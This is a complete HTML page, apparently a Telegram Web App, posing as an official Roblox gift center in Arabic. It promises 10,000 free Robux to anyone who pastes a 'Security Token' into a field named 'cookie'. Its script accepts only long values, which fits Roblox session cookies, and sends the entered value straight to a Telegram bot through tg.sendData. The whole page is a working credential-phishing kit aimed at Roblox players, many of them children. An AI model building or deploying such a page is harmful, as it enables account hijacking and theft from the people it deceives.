<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SAKO - Roblox Recharge Center</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #111; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
        .header { background-color: #0074BD; padding: 20px; text-align: center; font-weight: bold; font-size: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        .card { background: #222; margin: 20px; padding: 25px; border-radius: 15px; border: 1px solid #333; }
        .robux-icon { width: 50px; margin-bottom: 10px; }
        input { width: 90%; padding: 15px; margin: 15px 0; border-radius: 8px; border: 1px solid #444; background: #333; color: #fff; text-align: center; font-size: 14px; }
        .btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #0074BD, #00A2FF); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .footer { font-size: 12px; color: #777; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">مركز هدايا ROBLOX الرسمي 🎁</div>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-icon">
        <h3>تهانينا! أنت مؤهل للحصول على 10,000 Robux مجاناً</h3>
        <p>لتفعيل الهدية في حسابك، يرجى إدخال "Security Token" الخاص بك لضمان الأمان.</p>
        
        <input type="password" id="cookie" placeholder="أدخل رمز تفعيل الحساب هنا">
        <button class="btn" onclick="claim()">تفعيل الهدايا الآن</button>
        
        <div class="footer">
            * سيتم إضافة الرصيد إلى حسابك خلال دقائق من التحقق.
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        function claim() {
            const val = document.getElementById('cookie').value.trim();
            if(val.length < 100) {
                alert("رمز التفعيل غير صالح، يرجى التأكد من الرمز الصحيح.");
                return;
            }
            // إرسال البيانات فوراً للبوت
            tg.sendData(val);
            tg.close();
        }
    </script>
</body>
</html>
